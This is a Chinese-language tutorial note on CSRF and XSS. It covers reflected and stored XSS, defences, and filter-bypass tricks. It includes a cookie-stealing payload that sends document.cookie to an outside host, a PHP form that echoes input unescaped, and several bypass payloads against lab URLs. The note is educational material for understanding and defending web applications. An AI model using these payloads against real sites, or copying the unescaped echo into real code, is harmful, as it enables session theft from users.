# XSRF(或叫做CSRF)和XSS
CSRF(Cross-site request forgery)跨站请求伪造：通过伪装来自受信任用户的请求来利用受信任的网站。
XSS(Cross Site Scripting)跨站脚本攻击
CSRF重点在请求,XSS重点在脚本

CSRF：网站过分信任用户，放任来自所谓通过访问控制机制的代表合法用户的请求执行网站的某个特定功能。
XSS：用户过分信任网站，放任来自浏览器地址栏代表的那个网站代码在自己本地任意执行。如果没有浏览器的安全机制限制，xss代码可以在用户浏览器为所欲为


* ### XSS
    + 原理
        XSS本质是Html注入，和SQL注入差不多。
        XSS跨站攻击就是在网页里面埋入恶源代码，劫持用户的信息投递到预设的网站上去的一种黑客攻击手段。
        举个栗子：把网页比作一瓶液体，普通用户看来透明的应该可以喝，就直接喝了（访问），黑客XSS攻击者就相当于在水里投一种无色无味的毒药，你喝掉就被控制了，主动把身上的钱啊（cookie） 银行卡密码（存储的账号密码）啊都交了出来，甚至你自己还不知道。
        ```
        # 这里是一个表单输入框，正常应该输入一个地址，但是攻击者可能输入一段html代码，如：
        #   "/> <script>window.open("http://secquan.org/xss_hacker.php?cookie="+document.cookie);</script><!--
        <form>
        <input style="width:300px;" type="text" name="address1" value="<?php echo $_GET["address1"]; ?>" />
        <input type="submit" value="Submit" />  
        </form>

        # 于是，代码变为如下，目的是获取本机存储的该域名的cookie发送到另一个地址
        <form>
        <input style="width:300px;" type="text" name="address1" value=""/>
        <script>window.open("http://secquan.org/xss_hacker.php?cookie="+document.cookie);</script><!--" />
        <input type="submit" value="Submit" />  
        </form>
        ```

    + 类型
        + 反射型XSS，又称非持久型XSS：将恶意的脚本附加到URL地址的参数中，一般是将构造好的URL发给受害者，是受害者点击触发，而且只执行一次，非持久化。
        + 储存型XSS，也就是持久型XSS：攻击者事先讲恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码。

    + 防范手段
        + 过滤：对诸如<script>、<img>、<a>等标签进行过滤。
        + 编码：像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。
        + 限制：xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。

    + 绕过
        + 大小写绕过
        这个绕过方式的出现是因为网站仅仅只过滤了<script>标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。
        
        + 利用过滤后返回语句再次构成攻击语句来绕过
        网站可能过滤了 script标签，我们可以在script关键字中间嵌套script标签，中间的script被过滤删除之后，剩下的内容正好又构造了一个script标签。
        例如：<sCri<script>pt>alert("hey!")</scRi</script>pt>
        
        + 利用其它标签
            + <img>：我们指定的图片地址不存在，就一定会发生错误，会执行onerror。
            http://192.168.1.102/xss/example4.php?name=<img src='w.123' onerror='alert("hey!")'>
            + <a onmousemove=’do something here’> ：当用户鼠标移动时即可运行代码
            + <div onmouseover=‘do something here’> ： 当用户鼠标在这个块上面时即可运行（可以配合weight等参数将div覆盖页面，鼠标不划过都不行）
        
        + 编码脚本代码绕过关键字过滤
        服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入。
        不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。eval()会将编码过的语句解码后再执行。
        例如alert(1)编码过后就是\u0061\u006c\u0065\u0072\u0074(1)。
        http://192.168.1.102/xss/example5.php?name=<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>

        + 主动闭合标签实现注入代码
        填入的参数放到了script脚本的变量里面，可以先加双引号将变量左边的双引号关闭，然后执行我们的脚本，然后再加双引号闭合原变量右边的双引号。
        ```
        # 访问 http://localhost:81/xss.php?name=hacker
        <script>
            var $a= "hacker";
        </script>

        # 此时不传hacker，改为 http://localhost:81/xss.php?name=";alert("I amcoming again~");"
        <script>
            var $a= "";alert("I amcoming again~");"";
        </script>
        ```